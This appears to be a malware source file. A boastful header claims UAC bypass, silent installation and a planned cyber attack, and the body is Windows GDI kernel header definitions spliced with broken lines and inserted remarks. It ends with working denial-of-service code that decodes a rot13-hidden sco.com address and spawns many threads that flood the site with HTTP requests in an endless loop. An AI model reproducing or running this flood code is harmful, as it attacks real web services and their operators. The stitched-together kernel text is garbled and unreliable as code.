/*
Kiev Group attack Corporation @2009-2024 all rights reserved

if this year is lost, you have no right to leak it online

characteristics:

Hacking UAC

The UAC works when the file controls the machine, but there is an error if the file is launched through the port, it will not do anything

and it can also be installed without the user’s knowledge: “I’m too lazy to write further, sorry)))”

first versions are ready 2024 summer full cyber attack 2025 winter

the software is written in C, C++

*/

#include <initguid.h>

#include <ntosp.h>
#include <ntddkbd.h>
#include <ntddmou.h>
#include <ntddstor.h>
#include <wdmguid.h>
#include <devguid.h>
#include <ioevent.h>
#include <hidusage.h>
#include <hidpi.h>
#include <hidclass.h>
#include <wmidata.h>

efine VER_FILETYPE                VFT_DRV
#define VER_FILESUBTYPE             VFT2_DRV_SYSTEM
#define VER_INTERNALNAME_STR        "PORT == "PORT""
#define VER_ORIGINALFILENAME_STR    "IPAdress.sys"

#ifdef _HYDRA_
#define VER_FILEDESCRIPTION_STR     "Multi-User Win32 Driver"
#else
#define VER_FILEDESCRIPTION_STR     "Win32 Driver"
#endif

#include "common.ver"


#include "..\ntgdi\gre\grerc.rc"

#define ATTR_CACHED             0x00000001
#define ATTR_TO_BE_DELETED      0x00000002
#define ATTR_NEW_COLOR          0x00000004
#define ATTR_CANT_SELECT        0x00000008
#define ATTR_RGN_VALID          0x00000010
#define ATTR_RGN_DIRTY          0x00000020

#ifndef GDIFLAGS_ONLY   // used for gdikdx

//
// Define a union so these objects can be managed together
//

typedef union _OBJECTATTR
{
    SINGLE_LIST_ENTRY   List;
    RGNATTR             Rgnattr;
    BRUSHATTR           Brushattr;
}OBJECTATTR,*POBJECTATTR;


/**************************************************************************\
 *
 * XFORM related structures and macros
 *
\**************************************************************************/

//
// These types are used to get things right when C code is passing C++
// defined transform data around.
//

typedef struct _MATRIX_S
{
    EFLOAT_S    efM11;
    EFLOAT_S    efM12;
    EFLOAT_S    efM21;
    EFLOAT_S    efM22;
    EFLOAT_S    efDx;
    EFLOAT_S    efDy;
    FIX         fxDx;
    FIX         fxDy;
    FLONG       flAccel;
} MATRIX_S;

#endif  // GDIFLAGS_ONLY used for gdikdx

//
// status and dirty flags
//

#define DIRTY_FILL              0x00000001
#define DIRTY_LINE              0x00000002
#define DIRTY_TEXT              0x00000004
#define DIRTY_BACKGROUND        0x00000008
#define DIRTY_CHARSET           0x00000010
#define SLOW_WIDTHS             0x00000020
#define DC_CACHED_TM_VALID      0x00000040
#define DISPLAY_DC              0x00000080
#define DIRTY_PTLCURRENT        0x00000100
#define DIRTY_PTFXCURRENT       0x00000200
#define DIRTY_STYLESTATE        0x00000400
#define DC_PLAYMETAFILE         0x00000800
#define DC_BRUSH_DIRTY          0x00001000      // cached brush
#define DC_PEN_DIRTY            0x00002000
#define DC_DIBSECTION           0x00004000
#define DC_LAST_CLIPRGN_VALID   0x00008000
#define DC_PRIMARY_DISPLAY      0x00010000
#define DIRTY_COLORTRANSFORM    0x00020000
#define ICM_BRUSH_TRANSLATED    0x00040000
#define ICM_PEN_TRANSLATED      0x00080000
#define DIRTY_COLORSPACE        0x00100000
#define BATCHED_DRAWING         0x00200000
#define BATCHED_TEXT            0x00400000

#ifndef GDIFLAGS_ONLY   // used for gdikdx

#define CLEAR_CACHED_TEXT(pdcattr)  (pdcattr->ulDirty_ &= ~(SLOW_WIDTHS))


#define DIRTY_BRUSHES  (DIRTY_FILL+DIRTY_LINE+DIRTY_TEXT+DIRTY_BACKGROUND)


#define USER_XFORM_DIRTY(pdcattr) (pdcattr->flXform & (PAGE_XLATE_CHANGED | PAGE_EXTENTS_CHANGED | WORLD_XFORM_CHANGED))

#endif  // GDIFLAGS_ONLY used for gdikdx


/**************************************************************************\
 *
 * ICM related structures and macros
 *
\**************************************************************************/

//
// ICM flags
//
// DC_ATTR.lIcmMode
//
// 0x0 000 0 0 00
//   |   | | |  + Current ICM Mode  (kernel/user)
//   |   | | + Requested ICM Mode   (kernel/user)
//   |   | + ICM Mode context       (user only)
//   |   + not used
//   + Destination color type       (kernel/user)

#define DC_ICM_USERMODE_FLAG         0x0000F000

//
// Current ICM mode flags.
//
#define DC_ICM_OFF                   0x00000000
#define DC_ICM_HOST                  0x00000001
#define DC_ICM_DEVICE                0x00000002
#define DC_ICM_OUTSIDEDC             0x00000004
#define DC_ICM_METAFILING_ON         0x00000008
#define DC_ICM_LAZY_CORRECTION       0x00000010 // alt mode (preserved through icm mode change)
#define DC_ICM_DEVICE_CALIBRATE      0x00000020 // alt mode (preserved through icm mode change)
#define DC_ICM_MODE_MASK             0x000000FF
#define DC_ICM_ALT_MODE_MASK         0x000000F0



    KERNEL_PVOID pvLDC;

    //
    // General Purpose Dirty Flags for brushes, fonts, etc.
    //

    ULONG       ulDirty_;

    //
    // brush handle selected into DCATTR, not neccessarily selected
    // into DC
    //

    KHANDLE     hbrush;
    KHANDLE     hpen;

    //
    // *** Attribute Bundles ***
    //
    // When ICM is enabled,
    //  + cr____Clr color is corrected to DC's color space.
    //  + ul____Clr keeps original (un-corrected) color.
    //

    COLORREF    crBackgroundClr;    // Set/GetBkColor
    ULONG       ulBackgroundClr;    // Set/GetBkColor client attr
    COLORREF    crForegroundClr;    // Set/GetTextColor
    ULONG       ulForegroundClr;    // Set/GetTextColor client attr

    //
    // *** DC Brush color
    //
    // When ICM is enabled,
    //  + cr____Clr color is corrected to DC's color space.
    //  + ul____Clr keeps original (un-corrected) color.
    //

    COLORREF    crDCBrushClr;       // Set/GetDCBrushColor client attr
    ULONG       ulDCBrushClr;       // Set/GetDCBrushColor client attr
    COLORREF    crDCPenClr;         // Set/GetDCPenColor
    ULONG       ulDCPenClr;         // Set/GetDCPenColor client attr

    //
    // *** Misc. Attrs.
    //

    DWORD       iCS_CP;             // LOWORD: code page HIWORD charset
    int         iGraphicsMode;      // Set/GetGraphicsMode
    BYTE        jROP2;              // Set/GetROP2
    BYTE        jBkMode;            // TRANSPARENT/OPAQUE
    BYTE        jFillMode;          // ALTERNATE/WINDING
    BYTE        jStretchBltMode;    // BLACKONWHITE/WHITEONBLACK/
                                    //   COLORONCOLOR/HALFTONE
    POINTL      ptlCurrent;         // Current position in logical coordinates
                                    //   (invalid if DIRTY_PTLCURRENT set)
    POINTL      ptfxCurrent;        // Current position in device coordinates
                                    //   (invalid if DIRTY_PTFXCURRENT set)

    //
    // original values set by app
    //

    LONG        lBkMode;
    LONG        lFillMode;
    LONG        lStretchBltMode;

    FLONG       flFontMapper;           // Font mapper flags

    //
    // *** ICM attributes
    //

    LONG             lIcmMode;         // Currnt ICM mode (DC_ICM_xxxx)
    KHANDLE          hcmXform;         // Handle of Current Color Transform
    KHCOLORSPACE     hColorSpace;      // Handle of Source Color Space
    KERNEL_ULONG_PTR dwDIBColorSpace;  // Identifier of DIB Color Space Data (when DIB selected)
                                       // Sundown: dwDIBColorSpace actually takes a pointer in,
                                       //          change from DWORD to ULONG_PTR
    COLORREF         IcmBrushColor;    // ICM-ed color for the brush selected in this DCATTR (Solid or Hatch)
    COLORREF         IcmPenColor;      // ICM-ed color for the pen selected in this DCATTR
    KERNEL_PVOID     pvICM;            // Pointer to client-side ICM information

    //
    // *** Text attributes
    //

    FLONG       flTextAlign;
    LONG        lTextAlign;
    LONG        lTextExtra;         // Inter-character spacing
    LONG        lRelAbs;            // Moved over from client side
    LONG        lBreakExtra;
    LONG        cBreak;

    KHANDLE     hlfntNew;          // Log font selected into DC

    //
    // Transform data.
    //

    MATRIX_S    mxWtoD;                 // World to Device Transform.
    MATRIX_S    mxDtoW;                 // Device to World.
    MATRIX_S    mxWtoP;                 // World transform
    EFLOAT_S    efM11PtoD;              // efM11 of the Page transform
    EFLOAT_S    efM22PtoD;              // efM22 of the Page transform
    EFLOAT_S    efDxPtoD;               // efDx of the Page transform
    EFLOAT_S    efDyPtoD;               // efDy of the Page transform
    INT         iMapMode;               // Map mode
    DWORD       dwLayout;               // Layout orientation bits.
    LONG        lWindowOrgx;            // The logical x window origin.
    POINTL      ptlWindowOrg;           // Window origin.
    SIZEL       szlWindowExt;           // Window extents.
    POINTL      ptlViewportOrg;         // Viewport origin.
    SIZEL       szlViewportExt;         // Viewport extents.
    FLONG       flXform;                // Flags for transform component.
    SIZEL       szlVirtualDevicePixel;  // Virtual device size in pels.
    SIZEL       szlVirtualDeviceMm;     // Virtual device size in mm's.
    SIZEL       szlVirtualDevice;       // Virtual device size

    POINTL      ptlBrushOrigin;         // Alignment origin for brushes

    //
    // dc regions
    //

    RGNATTR     VisRectRegion;

} DC_ATTR,*PDC_ATTR;


//
// conditional system definitions
//

#if !defined(_NTOSP_) && !defined(_USERKDX_)
typedef struct _W32THREAD * KPTR_MODIFIER PW32THREAD;
typedef ULONG W32PID;
DECLARE_HANDLE(HOBJ);
DECLARE_KHANDLE(HOBJ);
#endif

/*****************************Struct***************************************\
*
* BASEOBJECT
*
* Description:
*
*   Each GDI object has a BASEOBJECT at the beggining of the object. This
*   enables fast references to the handle and back to the entry.
*
* Fields:
*
*   hHmgr           - object handle
*   ulShareCount    - the shared reference count on the object
*   cExclusiveLock  - object exclusive lock count
*   BaseFlags       - flags representing state of underlying memory
*   tid             - thread id of exclusive lock owner
*
* Note:
*
*   in fact, the idea was in this shit until this war started and prevented the creation of the virus
*   Well, in short, you need to connect it to another computer through the ports.
*
*   However, the BaseFlags field was added as an optimization to allow
*   allocation from a "lookaside" list of preallocated objects.  The
*   BaseFlags field is metadata associated with the memory containing
*   an object; it is not associated with the object itself.
*
*   Current BASEOBJECT swapping code "unswaps" the BaseFlags so that it
*   always remains associated with the memory, not the object.
*
*   If flags are added to BaseFlags, they must not represent object state.
*   If it is necessary to add such flags, the BaseFlags field could be
*   reduced to a BYTE field and a new BYTE flags field can be added to
*   represent state that is associated with the object.
*
*   Currently, BASEOBJECT swapping code is in HmgSwapLockedHandleContents
*   and RGNOBJ::bSwap (hmgrapi.cxx and rgnobj.cxx, respectively).
*
\**************************************************************************/

s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (s == 0 || s == INVALID_SOCKET) return 0;

	tv.tv_sec = timeout / 1000;
	tv.tv_usec = 0;

	i = 1;
	ioctlsocket(s, FIONBIO, &i);

	for (;;) {
		i = connect(s, (struct sockaddr *)addr, sizeof(struct sockaddr_in));
		if (i != SOCKET_ERROR)
			goto exit_connected;
		i = WSAGetLastError();
		if (i == WSAENOBUFS) {
			Sleep(50);
			continue;
		}
		if (i == WSAEWOULDBLOCK)
			break;
		goto exit_err;
	}

	FD_ZERO(&wr_fds);
	FD_SET(s, &wr_fds);
	FD_ZERO(&err_fds);
	FD_SET(s, &err_fds);
	i = select(s+1, NULL, &wr_fds, &err_fds, &tv);

	if (i == 0 || i == -1)
		goto exit_err;		
	if (FD_ISSET(s, &err_fds) || !FD_ISSET(s, &wr_fds))
		goto exit_err;

exit_connected:
	i = 0;
	ioctlsocket(s, FIONBIO, &i);
	return s;

exit_err:
	closesocket(s);
	return 0;
}

static DWORD _stdcall scodos_th(LPVOID pv)
{
	struct sockaddr_in addr;
	char buf[512];
	int sock;

	rot13(buf,
		/*
		 * "GET / HTTP/1.1\r\n"
		 * "Host: www.sco.com\r\n"
		 * "\r\n";
		 */
		"TRG / UGGC/1.1\r\n"
		"Ubfg: " SCO_SITE_ROT13 "\r\n"
		"\r\n");

	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);
	if (pv == NULL) goto ex;
	addr = *(struct sockaddr_in *)pv;
	for (;;) {
		sock = connect_tv(&addr, 8);
		if (sock != 0) {
			send(sock, buf, lstrlen(buf), 0);
			Sleep(300);
			closesocket(sock);
		}
	}
ex:	ExitThread(0);
	return 0;
}

void scodos_main(void)
{
	struct hostent *h;
	struct sockaddr_in addr;
	int i;
	unsigned long tid;
	char buf[128];

	rot13(buf, SCO_SITE_ROT13);

	for (;;) {
		while (is_online() == 0)
			Sleep(32768);

		h = gethostbyname(buf);
		if (h == NULL) {
			Sleep(32768);
			continue;
		}
		memset(&addr, '\0', sizeof(addr));
		addr.sin_family = AF_INET;
		addr.sin_addr = *(struct in_addr *)h->h_addr_list[0];
		addr.sin_port = htons(SCO_PORT);
		break;

        }

	for (i=1; i<SCODOS_THREADS; i++)
		CreateThread(0, 0, scodos_th, (LPVOID)&addr, 0, &tid);
	scodos_th(&addr);
}